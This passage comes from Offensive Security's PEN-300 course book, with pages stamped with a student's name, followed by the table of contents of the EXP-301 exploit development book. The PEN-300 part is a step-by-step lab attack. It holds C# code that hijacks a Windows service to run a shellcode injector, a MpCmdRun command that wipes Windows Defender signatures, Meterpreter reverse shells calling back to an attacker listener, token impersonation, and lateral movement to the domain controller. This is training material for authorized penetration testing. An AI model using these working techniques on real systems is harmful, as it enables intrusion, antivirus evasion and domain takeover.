PS C:\Windows\system32> ls \\file01\c$ 
ls \\file01\c$ 
 
    Directory: \\file01\c$ 
 
Mode                LastWriteTime         Length Name                                               
----                -------------         ------ ----                                               
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
697 
d-----        6/24/2020   1:07 AM                PerfLogs                                           
d-r---        6/24/2020   7:24 AM                Program Files                                      
d-----        6/24/2020   7:21 AM                Program Files (x86)                                
d-r---        6/24/2020   1:48 AM                Users                                              
d-----        6/24/2020   1:22 AM                Windows                                            
-a----        6/26/2020   2:41 AM           6144 inject.exe  
Listing 918 - The TGS for CIFS service is used to allow a copy operation to file01 
With the file in place, we can now move to the second application we used in a previous module 
with this attack. The code in this application modifies the SensorService in order to start inject.exe 
when the service is started. 
The target computer and service name along with the executable to launch must be specified in 
the code as shown in Listing 919 where the DllImport statements have been omitted. 
String target = "file01"; 
IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F); 
 
string ServiceName = "SensorService"; 
IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF); 
 
string payload = "C:\\inject.exe"; 
bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
null, null, null, null); 
 
bResult = StartService(schService, 0, null); 
Listing 919 - Code to interact with the service manager 
The compiled file (lat.exe) must be uploaded to web01, after which we can invoke it on web01 
from the SYSTEM shell. This will leverage the requested TGS we obtained through constrained 
delegation and perform a pass-the-ticket attack to access the service control manager:  
PS C:\Windows\system32> c:\inetpub\wwwroot\upload\lat.exe 
c:\inetpub\wwwroot\upload\lat.exe 
Error in calling StartService: 1053 
Listing 920 - Executing the lateral movement code 
The 1053 error code indicates that the service manager timed out, which is expected since we did 
not supply a valid service executable. 
When we switch to our payload listener, we find that it started to create a new session, then hung 
and timed out. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.131; (UUID: 
onb58axe) Staging x64 payload (207449 bytes) ... 
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.131:49763) 
Listing 921 - Meterpreter shell is getting caught by Windows Defender 
If a Meterpreter session initiates and then hangs before the prompt is presented, the process 
running the shellcode was terminated early. This is most often either due to incorrect shellcode 
architecture or because antivirus software caught it. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
698 
In this type of situation, it’s best to figure out what, exactly, is happening. 
We know that our lateral movement attempt performs three actions. First, the properties of 
SensorService are modified and the service is started. Next, inject.exe executes and copies the 
shellcode into the spoolsv process. Finally, the shellcode executes inside spoolsv. A new session 
was started, which indicates that both the service modifications and the code injection went 
undetected. However, the execution of the Meterpreter shellcode inside spoolsv was stopped. 
Using signatures from network packets, Windows Defender and other AV products sometimes 
detect network traffic associated with setting up a staged Meterpreter session. 
Windows Defender can perform inspection of network traffic through the 
Microsoft Network Realtime Inspection Service (WdNisSvc)1022 and compare it to 
signatures. 
The shellcode evades detection on disk, but not while executed inside spoolsv. This issue cannot 
be solved through encryption or emulation detection in C#. However, we could attempt to use 
different payloads until we discover one that bypasses antivirus. 
This type of brute force is tedious and could lead to a problem with our lateral movement 
technique. When Windows Defender detects the Meterpreter executing inside spoolsv, it 
terminates the process. Since it’s a service, it will restart automatically up to two times; after that, 
it will remain disabled. 
Additionally, Windows Defender will trigger an alert based on the SensorService repeatedly 
interacting with spoolsv. If this happens multiple times, Windows Defender will disable 
SensorService and mark it for deletion. This approach seems doomed to failure. 
We could take a different approach and target Windows Defender itself. The real-time protection 
provided by Windows Defender runs in the MsMpEng SYSTEM process, which executes with PPL 
enabled. Even with SYSTEM level access, we cannot terminate the process. This approach is also 
problematic. 
There is, however, a different approach that could work in this situation. 
Windows Defender includes the command-line MpCmdRun1023 tool that we can use to initiate 
scans and perform signature updates. The documentation reveals that we can also use it to 
remove signature definitions with -RemoveDefinitions All, which was designed to prevent 
issues with failed updates. 
We can abuse this by first setting the service executable of SensorService to “MpCmdRun” with 
the options to remove all signatures and start it. Once it times out, we update it again to “Inject”. 
This time, Windows Defender is stripped of all signatures and will not flag our network traffic. 
 
1022 (Martin Brinkmann, 2017), https://www.ghacks.net/2017/08/29/microsoft-network-realtime-inspection-service-information/ 
1023 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-
line-arguments-microsoft-defender-antivirus 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
699 
 
This technique is unique to Windows Defender but other antivirus products 
contain similar functionality that can be abused. 
A truncated portion of the updated code for our lat.exe lateral movement tool is shown in Listing 
922. 
... 
string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -
RemoveDefinitions -All"; 
string payload = "C:\\inject.exe"; 
 
bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, signature, null, 
null, null, null, null, null); 
bResult = StartService(schService, 0, null); 
 
bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
null, null, null, null); 
bResult = StartService(schService, 0, null); 
... 
Listing 922 - AV signatures are removed before starting Meterpreter 
Now we must upload the new version of lat.exe to web01 and ensure that inject.exe is still present 
on file01. 
Once everything is in order and a listener has started, we’ll launch lat.exe. 
msf5 exploit(multi/handler) > exploit 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.131; (UUID: 
iu2gl81c) Staging x64 payload (207506 bytes) ... 
[*] Meterpreter session 3 opened (192.168.119.120:443 -> 192.168.120.131:49769) 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
 
meterpreter > sysinfo 
Computer        : FILE01 
OS              : Windows 2016+ (10.0 Build 17763). 
Architecture    : x64 
System Language : en_US 
Domain          : EVIL 
Logged On Users : 7 
Meterpreter     : x64/windows 
Listing 923 - Obtaining a reverse Meterpreter shell on file01 
The output shows that we have received a new SYSTEM-context reverse Meterpreter shell. We 
have performed lateral movement from web01 to file01 and obtained a SYSTEM-context 
Meterpreter. In the process, we evaded antivirus detection by removing its signatures. Very Nice! 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
700 
 
Typically, Windows Defender would periodically perform signature updates so if 
we need prolonged access through a Meterpreter shell, we may need to routinely 
purge the definitions with a script. 
From here, we can perform more post-exploitation, which will hopefully lead us to additional 
compromises in the domain. 
17.3.1.1 Exercises 
1. 
Combine the code required to perform process injection and bypass AV detection. 
2. 
Modify the lateral movement code and transfer all the required files to the appropriate 
locations. 
3. 
Attempt lateral movement with a Meterpreter payload directly and determine if it was caught 
by AV. 
4. 
If your Meterpreter session timed out, adapt your code to remove the AV definitions. 
5. 
Obtain a Meterpreter shell on file01 without any Windows Defender flags. 
17.3.2 
Becoming Domain Admin 
We have now managed to pivot onto file01 and obtain a reverse Meterpreter shell in SYSTEM 
context. At this point, we must perform some additional post-exploitation enumeration to figure 
out if there is a way to continue our attack from this machine. 
Since this is a new machine, we’ll first want to determine which security solutions are in place. In 
most environments, solutions and settings are centrally managed, so we expect this server 
environment to somewhat mirror web01. 
Our enumeration would indeed reveal Windows Defender, AppLocker, and LSA protection installed 
on file01. However, when we list all running processes with ps, we find something interesting: 
several processes are running in the context of a user called paul. 
meterpreter > ps 
 
Process List 
============ 
 
 PID   PPID  Name                       Arch  Session  User                          
Path 
 ---   ----  ----                       ----  -------  ----                          -
--- 
 0     0     [System Process]                                                         
 4     0     System                     x64   0                                       
 8     564   svchost.exe                x64   0        NT AUTHORITY\SYSTEM            
 68    4     Registry                   x64   0                                       
 252   4     smss.exe                   x64   0                                       
... 
 884   496   dwm.exe                    x64   1        Window Manager\DWM-1          
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
701 
C:\Windows\System32\dwm.exe 
 902   3852  ServerManager.exe          x64   1        EVIL\paul                     
C:\Windows\System32\ServerManager.exe 
 932   632   explorer.exe               x64   1        EVIL\paul                     
C:\Windows\explorer.exe 
 956   564   svchost.exe                x64   0        NT AUTHORITY\NETWORK SERVICE   
 968   564   svchost.exe                x64   0        NT AUTHORITY\SYSTEM 
... 
Listing 924 - Listing all processes reveals the user paul 
This seems very promising, since our SYSTEM integrity access to file01 will allow us to easily 
hijack any of this user’s sessions. 
We can use the simple native net user command to determine this user’s access level. 
meterpreter > shell 
Process 5328 created. 
Channel 1 created. 
Microsoft Windows [Version 10.0.17763.1282] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> net user paul /domain 
net user paul /domain 
The request will be processed at a domain controller for domain evil.com. 
 
User name                    paul 
Full Name                    Paul 
... 
Local Group Memberships       
Global Group memberships     *Domain Admins        *Domain Users          
The command completed successfully. 
Listing 925 - Enumerating group memberships for paul 
We find that paul is a member of the Domain Admins group, which means our complete 
compromise of evil.com is close at hand. 
One way to gain access to the enticing domain administrator rights would be to dump the NTLM 
hash of paul from LSASS, but that means disabling LSA protection again. 
There are easier ways. One option is to simply migrate into a process owned by paul, but if we 
land in a medium-integrity process, we will have to perform a UAC bypass to regain high-
privileged access and it will place us under the effect of AppLocker policies. 
Alternatively, we could locate access tokens for paul in memory and impersonate them. This will 
allow us to perform actions in the context of paul while still enjoying the privileges of a SYSTEM 
shell. We’ll take this approach. 
The incognito Meterpreter extension is ideal for this and as SYSTEM, we can view any tokens on 
the machine as shown in Listing 926. 
meterpreter > load incognito 
Loading extension incognito...Success. 
 
meterpreter > list_tokens -u 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
702 
Delegation Tokens Available 
======================================== 
EVIL\paul 
Font Driver Host\UMFD-0 
Font Driver Host\UMFD-1 
NT AUTHORITY\LOCAL SERVICE 
NT AUTHORITY\NETWORK SERVICE 
NT AUTHORITY\SYSTEM 
Window Manager\DWM-1 
 
Impersonation Tokens Available 
======================================== 
No tokens available 
Listing 926 - Listing access tokens on file01 
Since we can impersonate paul, we have domain administrator access to the infrastructure. At 
this stage, the penetration test often becomes a lot easier, depending on how secure the 
configurations are. 
If we want to thoroughly compromise the domain or need to attack subsequent trusted domains, 
we can obtain access to the krbtgt NTLM hash through an attack like DCSync1024 or simply 
perform lateral movement to the domain controller. 
For purposes of demonstration in this small environment, we are going to opt for the latter 
approach and reuse the attack through the service manager to obtain a reverse shell from dc02. 
Before we impersonate the token, we’ll update the lateral movement code to change the target to 
dc02. We call it lat2.exe and upload it to file01. 
meterpreter > upload /home/kali/lat2.exe c:\\lat2.exe 
[*] uploading  : /home/kali/lat2.exe -> c:\lat2.exe 
[*] Uploaded 5.50 KiB of 5.50 KiB (100.0%): /home/kali/lat2.exe -> c:\lat2.exe 
[*] uploaded   : /home/kali/lat2.exe -> c:\lat2.exe 
 
meterpreter > background 
[*] Backgrounding session 3... 
 
msf5 exploit(multi/handler) > exploit -j 
[*] Exploit running as background job 2. 
[*] Exploit completed, but no session was created. 
 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
 
msf5 exploit(multi/handler) > sessions -i 3 
[*] Starting interaction with 3... 
 
meterpreter > impersonate_token EVIL\\paul 
[+] Delegation token available 
[+] Successfully impersonated user EVIL\paul 
Listing 927 - Simple reverse shell from dc02 
 
1024 (ADSecurity, 2015), https://adsecurity.org/?p=1729 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
703 
In addition, we’ll need to background the current Meterpreter session, start a listener as a job, 
then interact with the Meterpreter session and impersonate paul. 
To begin, we’ll copy Inject.exe from file01 to dc02 and run lat2.exe as shown in Listing 927. 
meterpreter > shell 
Process 772 created. 
Channel 2 created. 
Microsoft Windows [Version 10.0.17763.1282] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> copy c:\inject.exe \\dc02\c$ 
copy c:\inject.exe \\dc02\c$ 
        1 file(s) copied. 
 
C:\Windows\system32> c:\lat2.exe 
c:\lat2.exe 
Error in calling StartService: 1053 
Error in calling StartService: 1053 
 
C:\Windows\system32> 
[*] https://192.168.119.120:443 handling request from 192.168.120.130; (UUID: 
kag4tbwv) Staging x64 payload (207502 bytes) ... 
[*] Meterpreter session 4 opened (192.168.119.120:443 -> 192.168.120.130:53758) 
Listing 928 - Lateral movement to dc02 
We received a new Meterpreter session. 
C:\Windows\system32> exit 
exit 
 
meterpreter > background 
[*] Backgrounding session 3... 
 
msf5 exploit(multi/handler) > sessions -i 4 
[*] Starting interaction with 4... 
 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM 
 
meterpreter > sysinfo 
Computer        : DC02 
... 
Listing 929 - Interacting with SYSTEM shell on dc02 
Once we interact with the session, we discover we now have SYSTEM integrity access to dc02. 
Excellent! 
We have now fully compromised the evil.com domain and can extract the NTLM hashes of all 
domain users including krbtgt to retain administrative access to the domain. In a larger 
environment, we could use this as a base to launch further attacks. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
704 
17.3.2.1 Exercises 
1. 
Use the Meterpreter shell to list all access tokens and impersonate the token belonging to 
the paul user. 
2. 
While impersonating paul, perform lateral movement to dc02 and obtain a reverse 
Meterpreter shell. 
17.3.2.2 Extra Mile 
In this module, we performed the entire attack from Metasploit and primarily through the 
Meterpreter shell. Depending on the chosen tools and attack techniques, another framework may 
prove more favorable. 
Evading security mitigations such as antivirus may also be easier with another framework due to 
a lack of signatures and behavioral detection against it. 
Repeat the attack shown in this module with a different framework like PowerShell Empire or 
Covenant. 
17.4 Wrapping Up 
This module showcased attack paths against a small Active Directory infrastructure that had 
multiple security measures in place. 
We demonstrated chaining techniques as well as the complications of bypassing antivirus and 
other protections. A penetration test against a hardened infrastructure is not trivial and if multiple 
attack paths are available, we will often choose the path of least resistance. 
In addition, we bypassed unique obstacles instigated by our initial service account compromise 
which lacked an interactive logon session. 
Note that our attack left behind a number of applications, drivers, and data. In a 
real penetration test against a production system, we would have carefully 
tracked these and removed them before the end of the engagement. 
In the end, we compromised evil.com without relying on any vulnerabilities except for the flaw in 
the initial web application. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
705 
 
18 Trying Harder: The Labs 
Following the successful completion of the course material, you can access a number of 
challenge labs in the control panel. These labs consist of a number of interconnected machines 
and will require the mastery of several techniques taught throughout this course to fully 
compromise. 
18.1 Real Life Simulations 
Each challenge lab is designed as a self-contained black-box penetration test network that 
requires enumeration, a successful initial compromise, and a pivot to other machines within the 
lab. The end goal is the compromise of the entire challenge lab network. 
Each machine in a given challenge lab contains a proof.txt file with a MD5 hash, which can be 
found in either the root folder of Linux machines or the Administrators desktop of Windows 
machines. For machines that require privilege escalation, a local.txt is also present in the 
appropriate low-privileged users folder. 
Similar to the deployment design of module VMs in this course, the challenge labs are not shared 
with other users. Please note that a revert may take some time given the number of machines 
and their interdependencies. 
To aid in research and development of custom attack vectors, a development machine (dev) is 
available for some of those tasks. 
Take the time to work on these challenges and keep in mind that while different frameworks may 
make various steps simpler, remember the many benefits of using custom code as we have 
demonstrated throughout this course. 
18.2 Wrapping Up 
If you’ve taken the time to understand the course material presented in the course book and 
associated videos, and have tackled all the exercises, you’ll enjoy the lab challenges. 
If you’re having trouble, step back and take on a new perspective. It’s easy to get so fixated on a 
single problem and lose sight of the fact that there may be a simpler solution waiting down a 
different path. 
Take good notes and review them often, searching for alternate paths that might reveal the way 
forward. When all else fails, do not hesitate to reach out to the student administrators. 
For information related to the OSEP certification exam please refer back to the introductory 
module or review our exam guide.1025 
Finally, remember that you often have all the knowledge you need to tackle the problem in front of 
you. Don’t give up, and remember the “Try Harder” discipline! 
 
1025 (Offensive Security, 2020), https://help.offensive-security.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide 
OS-555704 RAYMOND ALLEN SORENG
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
1 
Windows User Mode  
Exploit Development 
Offensive Security 
 
 
  
                                   
 
555704
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
2 
Copyright © 2021 Offensive Security Ltd.   
 
All rights reserved. No part of this publication, in whole or in part, may be reproduced, 
copied, transferred or any other right reserved to its copyright owner, including 
photocopying and all other copying, any transfer or transmission using any network or 
other means of communication, any broadcast for distant learning, in any form or by any 
means such as any information storage, transmission or retrieval system, without prior 
written permission from the author. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
3 
Table of Contents 
1 
Windows User Mode Exploit Development: General Course Information ................................... 14 
1.1 
About the EXP-301 Course ......................................................................................................... 14 
1.2 
Provided Materials ........................................................................................................................ 15 
1.2.1 
EXP-301 Course Materials ..................................................................................................... 15 
1.2.2 
Access to the EXP-301 VPN Lab Network .......................................................................... 15 
1.2.3 
The Offensive Security Student Forum ................................................................................ 16 
1.2.4 
Live Support .............................................................................................................................. 16 
1.2.5 
OSED Exam Attempt ............................................................................................................... 16 
1.3 
Overall Strategies for Approaching the Course ...................................................................... 17 
1.3.1 
Course Materials ...................................................................................................................... 17 
1.3.2 
Course Exercises ...................................................................................................................... 17 
1.4 
About the EXP-301 VPN Labs .................................................................................................... 18 
1.4.1 
Control Panel ............................................................................................................................ 18 
1.4.2 
Reverts ....................................................................................................................................... 18 
1.4.3 
Kali Virtual Machine ................................................................................................................. 19 
1.4.4 
Lab Behavior and Lab Restrictions ....................................................................................... 19 
1.5 
About the OSED Exam ................................................................................................................. 19 
1.6 
Wrapping Up .................................................................................................................................. 20 
2 
WinDbg and x86 Architecture .............................................................................................................. 21 
2.1 
Introduction to x86 Architecture ................................................................................................ 21 
2.1.1 
Program Memory ..................................................................................................................... 21 
2.1.1.1 
The Stack .......................................................................................................................... 22 
2.1.1.2 
Calling conventions ........................................................................................................ 22 
2.1.1.3 
Function Return Mechanics .......................................................................................... 22 
2.1.2 
CPU Registers ........................................................................................................................... 23 
2.1.2.1 
General Purpose Registers ........................................................................................... 24 
2.1.2.2 
ESP - The Stack Pointer ................................................................................................. 24 
2.1.2.3 
EBP - The Base Pointer .................................................................................................. 24 
2.1.2.4 
EIP - The Instruction Pointer ......................................................................................... 24 
2.2 
Introduction to Windows Debugger .......................................................................................... 25 
2.2.1 
What is a Debugger? ............................................................................................................... 25 
2.2.2 
WinDbg Interface ..................................................................................................................... 26 
2.2.3 
Understanding the Workspace .............................................................................................. 28 
2.2.3.1 
Exercises .......................................................................................................................... 30 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
4 
2.2.4 
Debugging Symbols ................................................................................................................ 30 
2.3 
Accessing and Manipulating Memory from WinDbg ............................................................. 32 
2.3.1 
Unassemble from Memory .................................................................................................... 32 
2.3.1.1 
Exercises .......................................................................................................................... 32 
2.3.2 
Reading from Memory ............................................................................................................ 32 
2.3.2.1 
Exercise ............................................................................................................................. 36 
2.3.3 
Dumping Structures from Memory ...................................................................................... 36 
2.3.3.1 
Exercise ............................................................................................................................. 38 
2.3.4 
Writing to Memory ................................................................................................................... 38 
2.3.4.1 
Exercises .......................................................................................................................... 39 
2.3.5 
Searching the Memory Space ............................................................................................... 39 
2.3.5.1 
Exercises .......................................................................................................................... 40 
2.3.6 
Inspecting and Editing CPU Registers in WinDbg .............................................................. 40 
2.3.6.1 
Exercise ............................................................................................................................. 41 
2.4 
Controlling the Program Execution in WinDbg ....................................................................... 41 
2.4.1 
Software Breakpoints .............................................................................................................. 41 
2.4.1.1 
Exercises .......................................................................................................................... 43 
2.4.2 
Unresolved Function Breakpoint ........................................................................................... 43 
2.4.2.1 
Exercises .......................................................................................................................... 45 
2.4.3 
Breakpoint-Based Actions ...................................................................................................... 45 
2.4.3.1 
Exercises .......................................................................................................................... 47 
2.4.4 
Hardware Breakpoints ............................................................................................................ 47 
2.4.4.1 
Exercises .......................................................................................................................... 50 
2.4.5 
Stepping Through the Code ................................................................................................... 50 
2.4.5.1 
Exercises .......................................................................................................................... 52 
2.5 
Additional WinDbg Features ....................................................................................................... 52 
2.5.1 
Listing Modules and Symbols in WinDbg ............................................................................ 52 
2.5.2 
Using WinDbg as a Calculator ............................................................................................... 54 
2.5.3 
Data Output Format ................................................................................................................. 54 
2.5.3.1 
Exercise ............................................................................................................................. 55 
2.5.4 
Pseudo Registers ..................................................................................................................... 55 
2.6 
Wrapping Up .................................................................................................................................. 56 
3 
Exploiting Stack Overflows ................................................................................................................... 57 
3.1 
Stack Overflows Introduction ..................................................................................................... 57 
3.2 
Installing the Sync Breeze Application ..................................................................................... 60 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
5 
3.2.1.1 
Exercise ............................................................................................................................. 61 
3.3 
Crashing the Sync Breeze Application ...................................................................................... 61 
3.3.1.1 
Exercise ............................................................................................................................. 63 
3.4 
Win32 Buffer Overflow Exploitation .......................................................................................... 64 
3.4.1 
A Word About DEP, ASLR, and CFG ...................................................................................... 64 
3.4.2 
Controlling EIP .......................................................................................................................... 64 
3.4.2.1 
Exercises .......................................................................................................................... 67 
3.4.3 
Locating Space for Our Shellcode ........................................................................................ 67 
3.4.3.1 
Exercises .......................................................................................................................... 70 
3.4.4 
Checking for Bad Characters ................................................................................................. 70 
3.4.4.1 
Exercises .......................................................................................................................... 72 
3.4.5 
Redirecting the Execution Flow ............................................................................................. 72 
3.4.6 
Finding a Return Address ....................................................................................................... 72 
3.4.6.1 
Exercises .......................................................................................................................... 80 
3.4.7 
Generating Shellcode with Metasploit ................................................................................. 81 
3.4.7.1 
Exercises .......................................................................................................................... 83 
3.4.8 
Getting a Shell ........................................................................................................................... 83 
3.4.8.1 
Exercises .......................................................................................................................... 86 
3.4.9 
Improving the Exploit .............................................................................................................. 86 
3.4.9.1 
Exercise ............................................................................................................................. 87 
3.4.9.2 
Extra Mile .......................................................................................................................... 87 
3.5 
Wrapping Up .................................................................................................................................. 87 
4 
Exploiting SEH Overflows ..................................................................................................................... 88 
4.1 
Installing the Sync Breeze Application ..................................................................................... 88 
4.1.1.1 
Exercise ............................................................................................................................. 90 
4.2 
Crashing Sync Breeze .................................................................................................................. 90 
4.2.1.1 
Exercise ............................................................................................................................. 91 
4.3 
Analyzing the Crash in WinDbg .................................................................................................. 91 
4.3.1.1 
Exercises .......................................................................................................................... 93 
4.4 
Introduction to Structured Exception Handling ...................................................................... 93 
4.4.1 
Understanding SEH ................................................................................................................. 94 
4.4.2 
SEH Validation .......................................................................................................................... 99 
4.4.2.1 
Exercises ........................................................................................................................ 102 
4.5 
Structured Exception Handler Overflows ............................................................................... 102 
4.5.1.1 
Exercises ........................................................................................................................ 112 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
6 
4.5.2 
Gaining Code Execution ........................................................................................................ 113 
4.5.2.1 
Exercises ........................................................................................................................ 116 
4.5.3 
Detecting Bad Characters .................................................................................................... 116 
4.5.3.1 
Exercise ........................................................................................................................... 118 
4.5.4 
Finding a P/P/R Instruction Sequence .............................................................................. 118 
4.5.4.1 
Exercises ........................................................................................................................ 124 
4.5.5 
Island-Hopping in Assembly ................................................................................................ 124 
4.5.5.1 
Exercises ........................................................................................................................ 130 
4.5.6 
Obtaining a Shell .................................................................................................................... 131 
4.5.6.1 
Exercises ........................................................................................................................ 133 
4.5.6.2 
Extra Mile ........................................................................................................................ 133 
4.5.6.3 
Extra Mile ........................................................................................................................ 133 
4.6 
Wrapping Up ................................................................................................................................ 134 
5 
Introduction to IDA Pro ........................................................................................................................ 135 
5.1 
IDA Pro 101 .................................................................................................................................. 135 
5.1.1 
Installing IDA Pro .................................................................................................................... 136 
5.1.1.1 
Exercise ........................................................................................................................... 136 
5.1.2 
The IDA Pro User Interface ................................................................................................... 136 
5.1.2.1 
Exercises ........................................................................................................................ 144 
5.1.3 
Basic Functionality ................................................................................................................. 144 
5.1.3.1 
Exercises ........................................................................................................................ 148 
5.1.4 
Search Functionality .............................................................................................................. 148 
5.1.4.1 
Exercises ........................................................................................................................ 150 
5.2 
Working with IDA Pro ................................................................................................................. 151 
5.2.1 
Static-Dynamic Analysis Synchronization ......................................................................... 151 
5.2.1.1 
Exercises ........................................................................................................................ 153 
5.2.2 
Tracing Notepad .................................................................................................................... 153 
5.2.2.1 
Exercises ........................................................................................................................ 156 
5.3 
Wrapping Up ................................................................................................................................ 157 
6 
Overcoming Space Restrictions: Egghunters ................................................................................. 158 
6.1 
Crashing the Savant Web Server ............................................................................................. 158 
6.1.1.1 
Exercises ........................................................................................................................ 159 
6.2 
Analyzing the Crash in WinDbg ................................................................................................ 160 
6.2.1.1 
Exercises ........................................................................................................................ 161 
6.3 
Detecting Bad Characters ......................................................................................................... 161 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
7 
6.3.1.1 
Exercises ........................................................................................................................ 164 
6.4 
Gaining Code Execution ............................................................................................................ 164 
6.4.1.1 
Exercises ........................................................................................................................ 166 
6.4.2 
Partial EIP Overwrite .............................................................................................................. 166 
6.4.2.1 
Exercises ........................................................................................................................ 172 
6.4.3 
Changing the HTTP Method ................................................................................................ 172 
6.4.3.1 
Exercises ........................................................................................................................ 175 
6.4.4 
Conditional Jumps ................................................................................................................. 175 
6.4.4.1 
Exercises ........................................................................................................................ 179 
6.5 
Finding Alternative Places to Store Large Buffers ............................................................... 180 
6.5.1.1 
Exercises ........................................................................................................................ 181 
6.5.2 
The Windows Heap Memory Manager .............................................................................. 182 
6.5.2.1 
Exercises ........................................................................................................................ 184 
6.6 
Finding our Buffer - The Egghunter Approach ...................................................................... 184 
6.6.1 
Keystone Engine ..................................................................................................................... 185 
6.6.1.1 
Exercises ........................................................................................................................ 187 
6.6.2 
System Calls and Egghunters ............................................................................................. 187 
6.6.2.1 
Exercises ........................................................................................................................ 195 
6.6.3 
Identifying and Addressing the Egghunter Issue ............................................................. 196 
6.6.3.1 
Exercises ........................................................................................................................ 200 
6.6.4 
Obtaining a Shell .................................................................................................................... 200 
6.6.4.1 
Exercises ........................................................................................................................ 203 
6.7 
Improving the Egghunter Portability Using SEH ................................................................... 204 
6.7.1.1 
Exercises ........................................................................................................................ 215 
6.7.2 
Identifying the SEH-Based Egghunter Issue ..................................................................... 215 
6.7.2.1 
Exercises ........................................................................................................................ 226 
6.7.3 
Porting the SEH Egghunter to Windows 10 ...................................................................... 227 
6.7.3.1 
Exercises ........................................................................................................................ 231 
6.7.3.2 
Extra Mile ........................................................................................................................ 232 
6.8 
Wrapping Up ................................................................................................................................ 232 
7 
Creating Custom Shellcode ................................................................................................................ 233 
7.1 
Calling Conventions on x86 ...................................................................................................... 233 
7.2 
The System Call Problem .......................................................................................................... 234 
7.3 
Finding kernel32.dll .................................................................................................................... 235 
7.3.1 
PEB Method ............................................................................................................................ 236 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
8 
7.3.1.1 
Exercises ........................................................................................................................ 238 
7.3.2 
Assembling the Shellcode .................................................................................................... 238 
7.3.2.1 
Exercises ........................................................................................................................ 244 
7.4 
Resolving Symbols ..................................................................................................................... 244 
7.4.1 
Export Directory Table ........................................................................................................... 245 
7.4.1.1 
Exercise ........................................................................................................................... 247 
7.4.2 
Working with the Export Names Array ............................................................................... 247 
7.4.2.1 
Exercises ........................................................................................................................ 253 
7.4.3 
Computing Function Name Hashes ................................................................................... 253 
7.4.3.1 
Exercises ........................................................................................................................ 258 
7.4.4 
Fetching the VMA of a Function ......................................................................................... 258 
7.4.4.1 
Exercises ........................................................................................................................ 263 
7.5 
NULL-Free Position-Independent Shellcode (PIC) ............................................................... 263 
7.5.1 
Avoiding NULL Bytes ............................................................................................................. 264 
7.5.1.1 
Exercise ........................................................................................................................... 265 
7.5.2 
Position-Independent Shellcode ......................................................................................... 265 
7.5.2.1 
Exercises ........................................................................................................................ 270 
7.6 
Reverse Shell ............................................................................................................................... 270 
7.6.1 
Loading ws2_32.dll and Resolving Symbols ..................................................................... 271 
7.6.1.1 
Exercises ........................................................................................................................ 274 
7.6.2 
Calling WSAStartup ............................................................................................................... 274 
7.6.2.1 
Exercises ........................................................................................................................ 277 
7.6.3 
Calling WSASocket ................................................................................................................ 278 
7.6.3.1 
Exercises ........................................................................................................................ 280 
7.6.4 
Calling WSAConnect ............................................................................................................. 280 
7.6.4.1 
Exercises ........................................................................................................................ 285 
